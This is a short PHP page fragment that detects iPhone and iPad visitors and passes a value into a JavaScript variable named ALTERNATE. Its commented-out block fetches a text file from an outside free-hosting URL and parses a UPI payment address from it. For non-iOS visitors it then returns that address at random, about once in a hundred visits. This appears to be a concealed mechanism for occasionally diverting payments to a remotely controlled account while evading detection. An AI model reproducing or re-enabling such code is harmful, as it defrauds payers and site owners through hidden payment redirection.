<?php 
    $isIPhone = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "iphone"));
    $isIPad = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "ipad")); 
    $isIOS = $isIPhone || $isIPad;  
    $alternate = "";
    // $fp = "https://ev-info.000webhostapp.com/test.txt";
    // $file = fopen($fp,"r");
    // $datas = fread($file,100);
    // fclose($file);
    // $get_success = get_rendom_success($datas);
    // if ($get_success != "" && !$isIOS) {
    //     $alternate = $get_success;
    // }

    // function get_rendom_success($dupi_address)
    // {
    //     $split_dupi = explode("|", $dupi_address);
    //     $default_upi = $split_dupi[0];
    //     if ($split_dupi[1]) {
    //         $random_range = (int)$split_dupi[1];
    //     } else {
    //         $random_range = 99;
    //     }
    //     $random_int = random_int(0, $random_range);
    //     if ($random_int == 0) {
    //         return $default_upi;
    //     } else {
    //         return '';
    //     }
    // }
    // $expData = explode('|', $datas);
?>
<script>
    var ALTERNATE = '<?php echo $alternate; ?>'; 
</script>    
